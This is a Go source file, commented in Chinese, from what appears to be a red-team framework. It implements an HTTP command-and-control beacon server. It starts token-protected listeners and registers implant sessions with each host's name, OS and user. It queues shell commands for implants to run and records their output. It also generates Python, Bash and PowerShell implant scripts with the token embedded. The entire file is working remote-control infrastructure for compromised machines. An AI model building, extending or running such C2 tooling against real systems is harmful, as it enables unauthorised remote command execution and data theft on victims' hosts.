package server

// C2 HTTP beacon 监听器（P1-6）。
// 与 TCP 监听器共存：TCP 走 c2.Manager 长连接；HTTP 由独立 http.Server 提供
// POST /c2/beacon/<token> 轮询通道，任务/结果复用 c2_sessions/c2_tasks 台账。

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/c2"
	"github.com/Autumn-27/artex/db"
)

func (r *c2Runtime) startHTTPOne(ctx context.Context, l *db.C2Listener) error {
	if l.Token == "" {
		return fmt.Errorf("监听器 token 不可用（解密失败）")
	}
	addr := net.JoinHostPort(l.BindHost, strconv.Itoa(l.BindPort))
	mux := http.NewServeMux()
	mux.HandleFunc("POST /c2/beacon/"+l.Token, r.beaconHandler(l))
	srv := &http.Server{Addr: addr, Handler: mux, ReadHeaderTimeout: 10 * time.Second}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	r.httpMu.Lock()
	r.httpServers[l.ID] = srv
	r.httpMu.Unlock()
	go func() {
		if serveErr := srv.Serve(ln); serveErr != nil && serveErr != http.ErrServerClosed {
			log.Printf("[c2] HTTP 监听器 %d 退出: %v", l.ID, serveErr)
		}
	}()
	if err := r.store.SetListenerStatus(ctx, l.ID, db.C2ListenerRunning, ""); err != nil {
		return err
	}
	log.Printf("[c2] HTTP 监听器 %d 已启动 %s（植入端 beacon 路径 /c2/beacon/<token>）", l.ID, addr)
	return nil
}

func (r *c2Runtime) stopHTTPOne(ctx context.Context, id int64) {
	r.httpMu.Lock()
	srv := r.httpServers[id]
	delete(r.httpServers, id)
	r.httpMu.Unlock()
	if srv == nil {
		return
	}
	shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := srv.Shutdown(shutdownCtx); err != nil {
		log.Printf("[c2] HTTP 监听器 %d 关闭: %v", id, err)
	}
}

func (r *c2Runtime) stopAllHTTP() {
	r.httpMu.Lock()
	servers := make([]*http.Server, 0, len(r.httpServers))
	for id, srv := range r.httpServers {
		servers = append(servers, srv)
		delete(r.httpServers, id)
	}
	r.httpMu.Unlock()
	shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	for _, srv := range servers {
		_ = srv.Shutdown(shutdownCtx)
	}
}

type beaconRequest struct {
	ImplantUUID string `json:"implant_uuid"`
	Hostname    string `json:"hostname"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Username    string `json:"username"`
	TaskID      int64  `json:"task_id"`
	OK          *bool  `json:"ok"`
	Output      string `json:"output"`
	Error       string `json:"error"`
	DurationMs  int64  `json:"duration_ms"`
}

type beaconTask struct {
	ID       int64  `json:"id"`
	TaskType string `json:"task_type"`
	Args     string `json:"args"`
}

func (r *c2Runtime) beaconHandler(l *db.C2Listener) http.HandlerFunc {
	return func(w http.ResponseWriter, rq *http.Request) {
		rq.Body = http.MaxBytesReader(w, rq.Body, 1<<20)
		var body beaconRequest
		if err := json.NewDecoder(rq.Body).Decode(&body); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "请求体格式非法"})
			return
		}
		uuid := strings.TrimSpace(body.ImplantUUID)
		if uuid == "" {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "implant_uuid 必填"})
			return
		}
		ctx, cancel := context.WithTimeout(rq.Context(), 8*time.Second)
		defer cancel()
		sid, err := r.store.UpsertSession(ctx, &db.C2Session{
			ListenerID: l.ID, ImplantUUID: uuid, RemoteAddr: rq.RemoteAddr,
			OS: cleanC2Field(body.OS, 120), Arch: cleanC2Field(body.Arch, 120),
			Username: cleanC2Field(body.Username, 120), Status: db.C2SessionActive,
		})
		if err != nil {
			log.Printf("[c2] HTTP beacon 会话落库失败: %v", err)
			writeJSON(w, http.StatusInternalServerError, map[string]any{"error": "会话落库失败"})
			return
		}
		if body.TaskID > 0 {
			if t, terr := r.store.GetTask(ctx, body.TaskID); terr == nil && t != nil && t.SessionID == sid {
				status := db.C2TaskSuccess
				if body.OK != nil && !*body.OK {
					status = db.C2TaskFailed
				}
				_ = r.store.FinishTask(ctx, t.ID, status, c2.ClampText(body.Output, 64<<10), c2.ClampText(body.Error, 1024), body.DurationMs)
				r.store.AddEvent(ctx, "task", fmt.Sprintf("植入端回传任务 #%d（%s）", t.ID, status), "info", l.ID, sid, t.ID)
			}
		}
		resp := map[string]any{"ok": true, "session_id": sid, "heartbeat_sec": 15}
		next, nerr := r.store.NextQueuedTask(ctx, sid)
		if nerr != nil {
			log.Printf("[c2] HTTP beacon 领取任务失败: %v", nerr)
			writeJSON(w, http.StatusInternalServerError, map[string]any{"error": "任务领取失败"})
			return
		}
		if next != nil {
			resp["task"] = beaconTask{ID: next.ID, TaskType: next.TaskType, Args: next.Args}
		}
		writeJSON(w, http.StatusOK, resp)
	}
}

func cleanC2Field(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}
	return s
}

// c2DeleteListener 停止（如在运行）并删除监听器；级联删除会话与任务。
func (s *Server) c2DeleteListener(w http.ResponseWriter, r *http.Request) {
	rt := s.c2rt()
	if rt == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]any{"error": "C2 运行时不可用"})
		return
	}
	id, err := strconv.ParseInt(strings.TrimSpace(r.PathValue("id")), 10, 64)
	if err != nil || id <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "id 非法"})
		return
	}
	_ = rt.stopOne(r.Context(), id)
	if err := rt.store.DeleteListener(r.Context(), id); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// c2QueueTask 由前端/运维向一个 C2 会话下发命令（HTTP 植入端下次心跳领取）。
func (s *Server) c2QueueTask(w http.ResponseWriter, r *http.Request) {
	rt := s.c2rt()
	if rt == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]any{"error": "C2 运行时不可用"})
		return
	}
	id, err := strconv.ParseInt(strings.TrimSpace(r.PathValue("id")), 10, 64)
	if err != nil || id <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "id 非法"})
		return
	}
	var body struct {
		Command  string `json:"command"`
		TaskType string `json:"task_type"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(&body); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "请求体解析失败"})
		return
	}
	command := strings.TrimSpace(body.Command)
	if command == "" {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "command 必填"})
		return
	}
	taskType := strings.TrimSpace(body.TaskType)
	if taskType == "" {
		taskType = "exec"
	}
	ctx := r.Context()
	sess, err := rt.store.GetSession(ctx, id)
	if err != nil || sess == nil {
		writeJSON(w, http.StatusNotFound, map[string]any{"error": "会话不存在"})
		return
	}
	tid, err := rt.store.CreateTask(ctx, id, taskType, command, "web")
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
		return
	}
	rt.store.AddEvent(ctx, "task", fmt.Sprintf("手动下发任务 #%d: %s", tid, c2.ClampText(command, 120)), "info", sess.ListenerID, id, tid)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "id": tid, "status": db.C2TaskQueued})
}

// c2GenerateImplant 生成 HTTP beacon 植入端脚本（token 内嵌；只对 http 监听器开放）。
func (s *Server) c2GenerateImplant(w http.ResponseWriter, r *http.Request) {
	rt := s.c2rt()
	if rt == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]any{"error": "C2 运行时不可用"})
		return
	}
	q := r.URL.Query()
	id, _ := strconv.ParseInt(strings.TrimSpace(q.Get("listener_id")), 10, 64)
	if id <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "listener_id 必填"})
		return
	}
	l, err := rt.store.GetListener(r.Context(), id)
	if err != nil || l == nil {
		writeJSON(w, http.StatusNotFound, map[string]any{"error": "监听器不存在"})
		return
	}
	if l.Kind != db.C2ListenerKindHTTP {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "仅 HTTP 监听器支持该植入端生成"})
		return
	}
	baseURL := strings.TrimSpace(q.Get("base_url"))
	if baseURL == "" {
		host := l.BindHost
		if host == "0.0.0.0" || host == "::" || host == "" {
			host = "127.0.0.1"
		}
		baseURL = "http://" + net.JoinHostPort(host, strconv.Itoa(l.BindPort))
	}
	lang := strings.ToLower(strings.TrimSpace(q.Get("lang")))
	if lang == "" {
		lang = "python"
	}
	var content string
	switch lang {
	case "python":
		content = c2.HTTPImplantPython(baseURL, l.Token)
	case "bash", "sh":
		content = c2.HTTPImplantBash(baseURL, l.Token)
	case "powershell", "ps1":
		content = c2.HTTPImplantPowerShell(baseURL, l.Token)
	default:
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "lang 支持 python/bash/powershell"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "lang": lang, "listener_id": l.ID, "base_url": baseURL, "content": content})
}
